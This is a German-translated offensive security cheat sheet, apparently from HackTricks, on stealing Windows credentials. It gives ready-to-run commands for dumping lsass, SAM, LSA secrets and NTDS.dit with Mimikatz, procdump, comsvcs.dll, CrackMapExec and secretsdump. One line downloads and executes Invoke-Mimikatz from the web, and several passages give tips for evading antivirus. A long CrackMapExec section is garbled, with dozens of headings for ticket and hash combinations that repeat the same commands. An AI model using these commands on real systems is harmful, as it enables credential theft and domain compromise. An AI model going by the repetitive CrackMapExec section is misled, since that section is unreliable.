# Stealing Windows Credentials

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Finde andere Dinge, die Mimikatz tun kann, auf** [**dieser Seite**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Erfahren Sie hier mehr über einige mögliche Schutzmaßnahmen für Anmeldeinformationen.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten verhindern, dass Mimikatz einige Anmeldeinformationen extrahiert.**

## Anmeldeinformationen mit Meterpreter

Verwenden Sie das [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **das** ich erstellt habe, um **nach Passwörtern und Hashes** im Opfer zu suchen.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Umgehung von AV

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **ein legitimes Microsoft-Tool ist**, wird es nicht von Defender erkannt.\
Sie können dieses Tool verwenden, um den **lsass-Prozess zu dumpen**, den **Dump herunterzuladen** und die **Anmeldeinformationen lokal** aus dem Dump zu **extrahieren**.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}

{% endcode %}

{% code title="Anmeldeinformationen aus dem Dump extrahieren" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) durchgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Einige **AV** können die Verwendung von **procdump.exe zum Dumpen von lsass.exe** als **bösartig** erkennen, da sie die Zeichenfolge **"procdump.exe" und "lsass.exe"** erkennen. Es ist daher **unauffälliger**, den **PID** von lsass.exe an procdump **als Argument** zu übergeben **anstatt** den **Namen lsass.exe.**

### Dumping von lsass mit **comsvcs.dll**

Eine DLL namens **comsvcs.dll**, die sich in `C:\Windows\System32` befindet, ist für das **Dumpen des Prozessspeichers** im Falle eines Absturzes verantwortlich. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die mit `rundll32.exe` aufgerufen werden kann.\
Es ist irrelevant, die ersten beiden Argumente zu verwenden, aber das dritte ist in drei Komponenten unterteilt. Die Prozess-ID, die gedumpt werden soll, bildet die erste Komponente, der Speicherort der Dump-Datei die zweite, und die dritte Komponente ist strikt das Wort **full**. Es gibt keine alternativen Optionen.\
Nach dem Parsen dieser drei Komponenten wird die DLL aktiviert, um die Dump-Datei zu erstellen und den Speicher des angegebenen Prozesses in diese Datei zu übertragen.\
Die Verwendung der **comsvcs.dll** ist möglich, um den lsass-Prozess zu dumpen, wodurch das Hochladen und Ausführen von procdump überflüssig wird. Diese Methode wird ausführlich beschrieben unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Der folgende Befehl wird zur Ausführung verwendet:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Du kannst diesen Prozess mit** [**lssasy**](https://github.com/Hackndo/lsassy) **automatisieren.**

### **Lsass mit dem Task-Manager dumpen**

1. Rechtsklick auf die Taskleiste und auf Task-Manager klicken
2. Auf Mehr Details klicken
3. Im Reiter Prozesse nach dem Prozess "Local Security Authority Process" suchen
4. Rechtsklick auf den Prozess "Local Security Authority Process" und auf "Abbilddatei erstellen" klicken.

### Lsass mit procdump dumpen

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist eine von Microsoft signierte Binärdatei, die Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) Suite ist.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Protected Process Dumper Tool, das das Verschleiern von Speicherauszügen unterstützt und diese auf Remote-Workstations übertragen kann, ohne sie auf die Festplatte zu schreiben.

**Hauptfunktionen**:

1. Umgehung des PPL-Schutzes
2. Verschleierung von Speicherauszug-Dateien, um Defender signaturbasierte Erkennungsmechanismen zu umgehen
3. Hochladen von Speicherauszügen mit RAW- und SMB-Upload-Methoden, ohne sie auf die Festplatte zu schreiben (fileless dump)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes

```bash
cme smb <IP> -u <username> -p <password> --sam
```

### Dump LSA secrets

```bash
cme smb <IP> -u <username> -p <password> --lsa
```

### Dump NTDS

```bash
cme smb <IP> -u <username> -p <password> --ntds
```

### Dump SAM, LSA und NTDS

```bash
cme smb <IP> -u <username> -p <password> --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash

```bash
cme smb <IP> -u <username> -H <NTLM hash> --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Key

```bash
cme smb <IP> -u <username> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Ticket

```bash
cme smb <IP> -u <username> -p <password> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Overpass-the-Hash

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Overpass-the-Key

```bash
cme smb <IP> -u <username> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Overpass-the-Ticket

```bash
cme smb <IP> -u <username> -p <password> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Silver Ticket

```bash
cme smb <IP> -u <username> -p <password> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Golden Ticket

```bash
cme smb <IP> -u <username> -p <password> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash und Overpass-the-Hash

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Key und Overpass-the-Key

```bash
cme smb <IP> -u <username> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Ticket und Overpass-the-Ticket

```bash
cme smb <IP> -u <username> -p <password> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Silver Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -p <password> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash und Pass-the-Key

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash und Pass-the-Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash und Silver Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash und Golden Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Key, Overpass-the-Key und Pass-the-Ticket

```bash
cme smb <IP> -u <username> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Key, Overpass-the-Key und Silver Ticket

```bash
cme smb <IP> -u <username> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Key, Overpass-the-Key und Golden Ticket

```bash
cme smb <IP> -u <username> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Ticket, Overpass-the-Ticket und Silver Ticket

```bash
cme smb <IP> -u <username> -p <password> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Ticket, Overpass-the-Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -p <password> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Silver Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -p <password> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash, Pass-the-Key und Pass-the-Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash, Pass-the-Key und Silver Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash, Pass-the-Key und Golden Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash, Pass-the-Ticket und Silver Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash, Pass-the-Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash, Silver Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Key, Overpass-the-Key, Pass-the-Ticket und Silver Ticket

```bash
cme smb <IP> -u <username> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Key, Overpass-the-Key, Pass-the-Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Key, Overpass-the-Key, Silver Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Ticket, Overpass-the-Ticket, Silver Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -p <password> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash, Pass-the-Key, Pass-the-Ticket und Silver Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash, Pass-the-Key, Pass-the-Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash, Pass-the-Key, Silver Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash, Pass-the-Ticket, Silver Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Key, Overpass-the-Key, Pass-the-Ticket, Silver Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -k --sam --lsa --ntds
```

### Dump SAM, LSA und NTDS mit Pass-the-Hash, Overpass-the-Hash, Pass-the-Key, Pass-the-Ticket, Silver Ticket und Golden Ticket

```bash
cme smb <IP> -u <username> -H <NTLM hash> -k --sam --lsa --ntds
```
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA-Geheimnisse auslesen
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump die NTDS.dit von Ziel-DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump die NTDS.dit Passwort-Historie vom Ziel-DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Zeige das Attribut pwdLastSet für jedes NTDS.dit-Konto

```shell
dsquery * -filter "(&(objectCategory=person)(objectClass=user))" -attr samAccountName pwdLastSet
```

### Zeige die letzten 10 Kennwortänderungen

```shell
dsquery * -filter "(&(objectCategory=person)(objectClass=user))" -attr samAccountName pwdLastSet | sort /R /+29 | head -10
```

### Zeige die ersten 10 Kennwortänderungen

```shell
dsquery * -filter "(&(objectCategory=person)(objectClass=user))" -attr samAccountName pwdLastSet | sort /+29 | head -10
```
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Diese Dateien sollten sich **befinden** in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM._ Aber **du kannst sie nicht einfach auf normale Weise kopieren**, da sie geschützt sind.

### Aus der Registry

Der einfachste Weg, diese Dateien zu stehlen, ist, eine Kopie aus der Registry zu erhalten:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Lade** diese Dateien auf deine Kali-Maschine herunter und **extrahiere die Hashes** mit:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Sie können Kopien geschützter Dateien mit diesem Dienst erstellen. Sie müssen Administrator sein.

#### Verwendung von vssadmin

Die vssadmin-Binärdatei ist nur in Windows Server-Versionen verfügbar.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Aber Sie können dasselbe mit **Powershell** tun. Dies ist ein Beispiel dafür, **wie man die SAM-Datei kopiert** (die verwendete Festplatte ist "C:" und sie wird in C:\users\Public gespeichert), aber Sie können dies zum Kopieren jeder geschützten Datei verwenden:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Schließlich könnten Sie auch das [**PS-Skript Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Die **NTDS.dit**-Datei ist als das Herz von **Active Directory** bekannt und enthält wichtige Daten über Benutzerobjekte, Gruppen und deren Mitgliedschaften. Hier werden die **Passworthashes** für Domänenbenutzer gespeichert. Diese Datei ist eine **Extensible Storage Engine (ESE)**-Datenbank und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.

Innerhalb dieser Datenbank werden drei Haupttabellen geführt:

- **Data Table**: Diese Tabelle speichert Details über Objekte wie Benutzer und Gruppen.
- **Link Table**: Sie verfolgt Beziehungen wie Gruppenmitgliedschaften.
- **SD Table**: **Sicherheitsbeschreibungen** für jedes Objekt werden hier gehalten, um die Sicherheit und Zugriffskontrolle für die gespeicherten Objekte zu gewährleisten.

Mehr Informationen dazu: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ verwendet. Dann könnte **ein Teil** der **NTDS.dit**-Datei **im Speicher von `lsass`** gefunden werden (Sie können die zuletzt zugegriffenen Daten wahrscheinlich aufgrund der Leistungsverbesserung durch die Verwendung eines **Caches** finden).

#### Entschlüsselung der Hashes in NTDS.dit

Der Hash ist dreimal verschlüsselt:

1. Entschlüsseln des Passwortverschlüsselungsschlüssels (**PEK**) mit dem **BOOTKEY** und **RC4**.
2. Entschlüsseln des **Hashes** mit **PEK** und **RC4**.
3. Entschlüsseln des **Hashes** mit **DES**.

**PEK** hat den **gleichen Wert** in **jedem Domänencontroller**, aber er ist **verschlüsselt** in der **NTDS.dit**-Datei mit dem **BOOTKEY** der **SYSTEM-Datei des Domänencontrollers (unterscheidet sich zwischen Domänencontrollern)**. Deshalb benötigen Sie zur Extraktion der Anmeldeinformationen aus der NTDS.dit-Datei **die Dateien NTDS.dit und SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopieren von NTDS.dit mit Ntdsutil

Verfügbar seit Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Du könntest auch den [**Volume Shadow Copy**](./#stealing-sam-and-system) Trick verwenden, um die **ntds.dit** Datei zu kopieren. Denke daran, dass du auch eine Kopie der **SYSTEM Datei** benötigst (wiederum, [**dump es aus der Registry oder verwende den Volume Shadow Copy**](./#stealing-sam-and-system) Trick).

### **Extrahieren von Hashes aus NTDS.dit**

Sobald du die Dateien **NTDS.dit** und **SYSTEM** **erhalten** hast, kannst du Tools wie _secretsdump.py_ verwenden, um **die Hashes zu extrahieren**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Du kannst sie auch **automatisch extrahieren** mit einem gültigen Domain-Admin-Benutzer:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Für **große NTDS.dit Dateien** wird empfohlen, diese mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Schließlich kann man auch das **metasploit Modul**: _post/windows/gather/credentials/domain\_hashdump_ oder **mimikatz** `lsadump::lsa /inject` verwenden.

### **Extrahieren von Domain-Objekten aus NTDS.dit in eine SQLite-Datenbank**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Es werden nicht nur Geheimnisse extrahiert, sondern auch die gesamten Objekte und deren Attribute für eine weitere Informationsgewinnung, wenn die rohe NTDS.dit Datei bereits abgerufen wurde.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Der `SYSTEM` Hive ist optional, ermöglicht jedoch die Entschlüsselung von Geheimnissen (NT & LM Hashes, zusätzliche Anmeldeinformationen wie Klartext-Passwörter, Kerberos- oder Vertrauensschlüssel, NT & LM Passwort-Historien). Zusammen mit anderen Informationen werden die folgenden Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel für die letzte Anmeldung und Passwortänderung, Kontobeschreibungen, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, Organisationsbaum und Mitgliedschaft, vertrauenswürdige Domänen mit Vertrauensart, Richtung und Attributen...

## Lazagne

Laden Sie die Binärdatei von [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Sie können diese Binärdatei verwenden, um Anmeldeinformationen aus verschiedenen Software zu extrahieren.
```
lazagne.exe all
```
## Andere Werkzeuge zum Extrahieren von Anmeldeinformationen aus SAM und LSASS

### Windows credentials Editor (WCE)

Dieses Tool kann verwendet werden, um Anmeldeinformationen aus dem Speicher zu extrahieren. Laden Sie es herunter von: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrahiert Anmeldeinformationen aus der SAM-Datei
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrahieren Sie Anmeldeinformationen aus der SAM-Datei
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Laden Sie es herunter von: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) und **führen Sie es einfach aus**, und die Passwörter werden extrahiert.

## Abwehrmaßnahmen

[**Erfahren Sie hier mehr über einige Schutzmaßnahmen für Anmeldeinformationen.**](credentials-protections.md)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Weitere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben** oder **HackTricks als PDF herunterladen** möchten, schauen Sie sich die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop) an!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichen.

</details>
